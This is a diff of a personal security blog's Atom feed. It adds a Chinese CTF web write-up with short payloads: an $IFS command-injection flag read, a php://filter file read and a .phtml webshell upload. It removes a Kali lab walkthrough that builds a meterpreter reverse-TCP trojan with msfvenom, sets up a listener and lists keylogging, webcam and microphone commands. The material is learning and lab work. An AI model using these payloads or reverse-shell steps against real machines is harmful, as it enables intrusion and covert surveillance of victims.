@@ -6,7 +6,7 @@
   <link href="http://daweitech.github.io/atom.xml" rel="self"/>
   
   <link href="http://daweitech.github.io/"/>
-  <updated>2021-09-29T13:54:19.423Z</updated>
+  <updated>2021-10-04T13:17:04.739Z</updated>
   <id>http://daweitech.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>NSSCTF 2021 writeup</title>
+    <link href="http://daweitech.github.io/2021/10/04/web/2/"/>
+    <id>http://daweitech.github.io/2021/10/04/web/2/</id>
+    <published>2021-10-04T02:36:35.000Z</published>
+    <updated>2021-10-04T13:17:04.739Z</updated>
+    
+    <content type="html"><![CDATA[<p>参与了一下</p><p>新生赛，发现基础还不够扎实</p><p>顺便记录一下解题</p><h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p><img src="/2021/10/04/web/2/image-20211004103854327.png"></p><p>按照题目提示，F12</p><p>最开始无脑往下滑，被嘲讽了一波</p><p><img src="/2021/10/04/web/2/image-20211004104026843.png" alt="image-20211004104026843"></p><p>本来以为还要控制台修改时间获取</p><p>结果再往上找找就行</p><p><img src="/2021/10/04/web/2/image-20211004104228392.png" alt="image-20211004104228392"></p><h3 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h3><p><img src="/2021/10/04/web/2/image-20211004104329873.png" alt="image-20211004104329873"></p><p>提示足够明显了</p><p>直接连，这时候直接猜想到index.php文件（也可以不嫌麻烦dirsearch扫）</p><p>试着连</p><p><img src="/2021/10/04/web/2/image-20211004104536627.png" alt="image-20211004104536627"></p><p>成功连上</p><p><img src="/2021/10/04/web/2/image-20211004104630630.png" alt="image-20211004104630630"></p><h3 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h3><p>题如其意，很简单</p><p><img src="/2021/10/04/web/2/image-20211004104742735.png" alt="image-20211004104742735"></p><p><img src="/2021/10/04/web/2/image-20211004105437367.png" alt="image-20211004105437367"></p><p><img src="/2021/10/04/web/2/image-20211004105448146.png" alt="image-20211004105448146"></p><h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>这题很眼熟</p><p>很像之前做过的</p><p><img src="/2021/10/04/web/2/image-20211004110036413.png" alt="image-20211004110036413"></p><p><img src="/2021/10/04/web/2/image-20211004110055171.png" alt="image-20211004110055171"></p><p>这里抓包会被克制</p><p>直接用hackbar</p><p><img src="/2021/10/04/web/2/image-20211004110238860.png" alt="image-20211004110238860"></p><h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p><img src="/2021/10/04/web/2/image-20211004110322862.png" alt="image-20211004110322862"></p><p>数组绕过即可</p><p><img src="/2021/10/04/web/2/image-20211004110433124.png" alt="image-20211004110433124"></p><h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>改类型上传php，没什么好说的</p><h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p>上传phtml马文件绕过，蚁剑连上</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>基础题，直接查数据库，查表，最后查字名</p><h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><p>命令执行漏洞</p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p><h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><p><img src="/2021/10/04/web/2/QQ%E5%9B%BE%E7%89%8720211004210427.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9&#x2F;flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>伪协议读取</p><p>php://filter/read=convert.base64.encode/resource=flag.php</p><p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></p><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/web/2/image-20211004210242660.png" alt="image-20211004210242660"></p><h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">php反序列化漏洞绕过魔术方法 __wakeup - Mrsm1th - 博客园 (cnblogs.com)</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;参与了一下&lt;/p&gt;
+&lt;p&gt;新生赛，发现基础还不够扎实&lt;/p&gt;
+&lt;p&gt;顺便记录一下解题&lt;/p&gt;
+&lt;h3 id=&quot;gift-F12&quot;&gt;&lt;a href=&quot;#gift-F12&quot; class=&quot;headerlink&quot; title=&quot;gift_F12&quot;&gt;&lt;/a&gt;gift_F12&lt;/h3</summary>
+      
+    
+    
+    
+    
+    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战 2019 RCE ME</title>
@@ -462,29 +487,6 @@
     
     
     <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一次简单的kali渗透测试</title>
-    <link href="http://daweitech.github.io/2021/08/30/src/0830/"/>
-    <id>http://daweitech.github.io/2021/08/30/src/0830/</id>
-    <published>2021-08-30T08:44:34.000Z</published>
-    <updated>2021-08-31T08:45:15.675Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> 参考链接：</p><p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">记一次Kali系统渗透靶机(物理机)的详细过程（渗透必备）_k_love1219的博客-CSDN博客</a></p><p>首先开启kali-2018</p><p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p><p>接着我们开始创建木马文件</p><p>输入以下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的虚拟机ip地址 lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure><p>桌面会生成名为aaa.exe的木马文件</p><p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p><p>我们进入msfconsole</p><p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p><p>使用如下一系列指令：</p><p>使用exploit/multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><p>设置payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p>设置木马监听回传ip地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 你的虚拟机的ip地址</span><br></pre></td></tr></table></figure><p>设置木马监听回传端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p><p>还可以用 show options来确认是否设置成功</p><p>这时候我们利用社会工程学的知识来将木马病毒送进靶机</p><p>doge（可以设置放在物理机桌面上，然后点击运行即可，若不放心可自行前去任务管理器的详细信息查看是否有进程aaa.exe）</p><p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p><p>可以看到建立了session</p><p>说明我们已经成功连上了靶机</p><p>试着运行一些指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p><p>查看了靶机的一些信息</p><p>此外还有的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    获取系统ID以及计算机名称</span><br><span class="line">kill    中止进程</span><br><span class="line">ps    列举正在运行中的进程</span><br><span class="line">getpid    获取当前进程标识符</span><br><span class="line">keyscan_start     开启按键记录会话</span><br><span class="line">keyscan_stop     终止按键记录会话</span><br><span class="line">keyscan_dump   转储从被攻击主机捕获到的按键</span><br><span class="line">enumdesktops    列举所有可访问到的桌面和工作站</span><br><span class="line">getdesktop    获取当前meterpreter桌面</span><br><span class="line">setdesktop    变更meterpreter当前桌面</span><br><span class="line">webcam_list   列举系统中所有的摄像头</span><br><span class="line">webcam_snap   捕获被攻击主机的快照</span><br><span class="line">record_mic    从主机的默认麦克风中记录环境声音</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>找到更为高级的免杀木马文章：</p><p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSF制作免杀木马 - 迷途小書童~ - 博客园 (cnblogs.com)</a></p><h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>今天找到另外一篇文章来获取shell</p><p>操作方法差不多</p><p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kali利用MSF渗透Win 7获取shell_舞指如歌~的博客-CSDN博客</a></p><p>这次不懂为什么文件复制不到win7上，索性就用了物理机来试验</p><p><a href="https://blog.csdn.net/u012206617/article/details/97389338">获取Shell（提权）后的操作（windows、Linux）_墨痕诉清风的博客-CSDN博客_shell提权</a></p><p>这时候之前的一篇安全客文章就讲的十分详细了</p><p><a href="https://www.anquanke.com/post/id/235631">MSF使用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h4 id=&quot;8-30&quot;&gt;&lt;a href=&quot;#8-30&quot; class=&quot;headerlink&quot; title=&quot;8.30&quot;&gt;&lt;/a&gt;8.30&lt;/h4&gt;&lt;p&gt; 参考链接：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/k_love1219/articl</summary>
-      
-    
-    
-    
-    
-    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
     
   </entry>
   
